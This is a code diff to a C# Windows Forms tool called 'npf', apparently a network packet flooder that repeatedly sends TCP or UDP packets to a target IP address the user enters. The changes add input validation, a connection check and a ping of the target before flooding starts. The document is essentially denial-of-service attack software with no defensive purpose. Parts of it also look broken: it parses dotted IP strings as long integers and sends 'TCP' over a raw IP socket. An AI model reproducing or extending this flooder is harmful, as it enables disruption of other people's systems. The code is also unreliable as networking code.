@@ -3,6 +3,7 @@ using System.Net;
 using System.Net.Sockets;
 using System.Text;
 using System.Windows.Forms;
+using System.Net.NetworkInformation;
 
 namespace npf
 {
@@ -16,19 +17,36 @@ namespace npf
         {
 
         }
-
+        
         private void button1_Click(object sender, EventArgs e)
         {
             string intervall = intervalTxt.Text;
-            floodTimer.Interval = Int16.Parse(intervall);
-            if (floodTimer.Enabled)
+            int value;
+            if (int.TryParse(intervall, out value))
             {
-                MessageBox.Show("Flooding is still in progress.");
+                bool internetcon = CheckForInternetConnection(); // this checks the internet connection
+                if (internetcon)
+                {
+                    floodTimer.Interval = Int16.Parse(intervalTxt.Text);
+                    if (floodTimer.Enabled)
+                    {
+                        MessageBox.Show("Flooding is still in progress.");
+                    }
+                    else
+                    {
+                        MessageBox.Show("Flooding started.");
+                        floodTimer.Start();
+                    }
+                }
+                else
+                {
+                    MessageBox.Show("You do not have an internet connection, reconnect and try again.");
+                    System.Windows.Forms.Application.Exit();
+                }
             }
             else
             {
-                MessageBox.Show("Flooding started.");
-                floodTimer.Start();
+                MessageBox.Show("Incorrect interval. Please enter an integer.");
             }
         }
 
@@ -72,30 +90,21 @@ namespace npf
 
         private void floodTimer_Tick(object sender, EventArgs e)
         {
-            bool internetcon = CheckForInternetConnection(); // this checks the internet connection every second, it is not very efficient but i do not care
-            if (internetcon)
+            foreach (int s in ProtocolBox.CheckedIndices) // this checks which boxes were checked
             {
-                foreach (int s in ProtocolBox.CheckedIndices) // this checks which boxes were checked
+                int checkthings = Int16.Parse(s.ToString());
+                if (checkthings == 0)
                 {
-                    int checkthings = Int16.Parse(s.ToString());
-                    if (checkthings == 0)
-                    {
-                        floodTcp();
-                    }
-                    else if (checkthings == 1)
-                    {
-                        floodUdp();
-                    }
-                    else
-                    {
-                        MessageBox.Show("Please check you checked a box. Checking 0 or both will not work.");
-                    }
+                    floodTcp();
                 }
-            }
-            else
-            {
-                MessageBox.Show("You do not have an internet connection, reconnect and try again.");
-                System.Windows.Forms.Application.Exit();
+                else if (checkthings == 1)
+                {
+                    floodUdp();
+                }
+                else
+                {
+                    MessageBox.Show("Please check you checked a box. Checking 0 or both will not work.");
+                }
             }
         }
         private void floodUdp() // all the upcoming code happens every second or so
@@ -116,30 +125,59 @@ namespace npf
                 const string errorCaption = "Ensure that you have an internet connection and that all the data is entered correctly.";
                 MessageBox.Show(errorMessage, errorCaption,
                     MessageBoxButtons.OK);
+                floodTimer.Stop();
             }
         }
-        private void floodTcp() // just floodudp but for tcp
+        
+        private bool CheckTcpIP()
         {
-            TcpClient client = new TcpClient(); // this is just the tcp client, nothing interesting
             string ipaddr = IPText.Text;
             long ipaddrtcp = long.Parse(ipaddr);
             string localhost = GetLocalIPAddress();
             long localhosttcp = long.Parse(localhost);
-            try
+            Ping ping = new Ping();
+            PingReply pingreslut = ping.Send(ipaddr);
+            if (pingreslut.Status.ToString() == "Success")
             {
-                using (Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP))
+                return true;
+            }
+            else
+            {
+                return false;
+            }
+        }
+
+        private void floodTcp() // just floodudp but for tcp
+        {
+            string ipaddr = IPText.Text;
+            long ipaddrtcp = long.Parse(ipaddr);
+            string localhost = GetLocalIPAddress();
+            long localhosttcp = long.Parse(localhost);
+            var checkip = CheckTcpIP();
+            TcpClient client = new TcpClient(); // this is just the tcp client, nothing interesting
+            if (checkip)
+            {
+                try
                 {
-                    sock.Bind(new IPEndPoint(localhosttcp, 80)); // this binds to the local ip address
-                    byte[] data = Encoding.ASCII.GetBytes(DataText.Text);
-                    sock.SendTo(data, new IPEndPoint(ipaddrtcp, 80)); // this sends the tcp packet
+                    using (Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP))
+                    {
+                        sock.Bind(new IPEndPoint(localhosttcp, 80)); // this binds to the local ip address
+                        byte[] data = Encoding.ASCII.GetBytes(DataText.Text);
+                        sock.SendTo(data, new IPEndPoint(ipaddrtcp, 80)); // this sends the tcp packet
+                    }
+                }
+                catch
+                {
+                    const string errorMessage = "There was an error with npf.";
+                    const string errorCaption = "Ensure that you have an internet connection and that all the data is entered correctly.";
+                    MessageBox.Show(errorMessage, errorCaption,
+                        MessageBoxButtons.OK);
                 }
             }
-            catch
+            else
             {
-                const string errorMessage = "There was an error with npf.";
-                const string errorCaption = "Ensure that you have an internet connection and that all the data is entered correctly.";
-                MessageBox.Show(errorMessage, errorCaption,
-                    MessageBoxButtons.OK);
+                MessageBox.Show("IP Address invalid, please make sure it is valid.");
+                floodTimer.Stop();
             }
         }
     }
